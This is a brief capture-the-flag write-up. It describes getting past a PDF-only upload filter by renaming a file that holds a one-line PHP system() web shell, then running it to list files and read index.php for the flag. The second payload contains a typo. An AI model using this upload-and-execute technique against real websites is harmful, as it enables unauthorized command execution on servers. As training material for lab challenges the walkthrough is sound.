            This challenge was a bit tricky but after doing some research I was able to come up with the solution.

            We can see that there is a place to upload files but only .pdf files are allowed

            <img src="../../public/images/Web Security/JOIN TEAM/JOIN TEAM-1.png"/>

            So I did the following;

            <code>
            ┌──(ali㉿Kali)-[~]
            └─$ echo "<?php system('ls'); ?>" >test.txt

            ┌──(ali㉿Kali)-[~]
            └─$ mv test.txt test.pdf
            </code>

            I uploaded the test.pdf and magic!! It was successfully uploaded.

            <img src="../../public/images/Web Security/JOIN TEAM/JOIN TEAM-2.png"/>

            So I clicked on the test.pdf and i noticed something at the url…

            <img src="../../public/images/Web Security/JOIN TEAM/JOIN TEAM-3.png"/>

            I saw the /data/test.pdf so I copied as follows;

            <img src="../../public/images/Web Security/JOIN TEAM/JOIN TEAM-4.png"/>

            I edited the php code as follows;

            <code>
                <? php system('cat index.php'); ?>
            </code>

            After that we get the flag.
